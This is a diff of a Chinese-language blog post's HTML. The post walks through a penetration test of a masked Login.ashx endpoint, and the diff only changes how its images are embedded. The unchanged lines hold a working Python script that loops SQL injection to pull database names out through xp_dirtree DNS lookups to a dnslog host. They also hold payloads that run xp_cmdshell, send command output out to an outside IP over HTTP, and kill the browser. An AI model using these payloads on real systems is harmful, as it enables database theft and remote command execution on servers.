@@ -193,7 +193,7 @@
 <p>后来我一通百度之后也没找到sql server把字符串转为16进制的函数。。这就很尴尬了，有找到的麻烦告诉我下。</p>
 <p>接下来，我写了个脚本，吧所有的裤名跑了出来。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> urllib2</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</div><div class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</div><div class="line">        <span class="keyword">continue</span></div><div class="line">    url = <span class="string">'''http://xxxx.xxxx.com.cn/Login.ashx?Id=123%27;DECLARE%20@host%20varchar(1024);SELECT%20@host=CONVERT(varchar(1048),(select%20name%20from%20master.dbo.sysdatabases%20where%20dbid=1%20))%2b%27.xxxxxxxx.dnslog.link%27;EXEC(%27master..xp_dirtree%20%22\\\\%27%2b@host%2b%27\\foobar$%22%27);--'''</span></div><div class="line">    url = url.replace(<span class="string">"dbid=1"</span>,<span class="string">"dbid="</span>+str(i))</div><div class="line">    req = urllib2.Request(url)</div><div class="line">    <span class="keyword">print</span> req.get_full_url()</div><div class="line">    <span class="keyword">print</span> urllib2.urlopen(req).read()</div></pre></td></tr></table></figure>
-<p>dns日志如下<br>![pic1][<a href="http://Levi.cx/img/v2-480eb6d6476e8dbaf8a82af6ee2b0e98_b.png" target="_blank" rel="external">http://Levi.cx/img/v2-480eb6d6476e8dbaf8a82af6ee2b0e98_b.png</a>]<br>到这步其实已经可以dump数据库了，但是我发现还可以继续渗透。</p>
+<p>dns日志如下<br><img src="http://Levi.cx/img/v2-480eb6d6476e8dbaf8a82af6ee2b0e98_b.png" alt="pic1"><br>到这步其实已经可以dump数据库了，但是我发现还可以继续渗透。</p>
 <p>经过测试，我发现是sa权限，于是我开启了xp_cmdshell组件进行命令执行</p>
 <blockquote>
 <p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec</a> master..xp_cmdshell ‘ping cmdtest.xxxxxxxx.dnslog.link’–</p>
@@ -213,7 +213,7 @@
 <p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec</a> master..xp_cmdshell “for /F %s in (‘dir’) do start <a href="http://123.123.123.123/?%s&quot;--" target="_blank" rel="external">http://123.123.123.123/?%s&quot;--</a> </p>
 </blockquote>
 <p>搭建http服务器看web日志，利用for设置变量存储命令执行结果 start进行http访问并带上结果</p>
-<p>成功收到结果，这儿我想 用ping命令进行拼接然后读取dns日志应该也是没问题的，不过应该没走http好使<br>![pic2][<a href="http://Levi.cx/img/v2-a62ad8303dda9c5e214d7bd16caafc50_b" target="_blank" rel="external">http://Levi.cx/img/v2-a62ad8303dda9c5e214d7bd16caafc50_b</a>]</p>
+<p>成功收到结果，这儿我想 用ping命令进行拼接然后读取dns日志应该也是没问题的，不过应该没走http好使<br><img src="http://Levi.cx/img/v2-a62ad8303dda9c5e214d7bd16caafc50_b.png" alt="pic2"></p>
 <p>由于start会启动浏览器，所以要关闭一下浏览器</p>
 <blockquote>
 <p><a href="http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec" target="_blank" rel="external">http://xxxx.xxxx.com.cn/Login.ashx?Id=123&#39;;exec</a> master..xp_cmdshell “taskkill /f /im iexplore.exe”–</p>
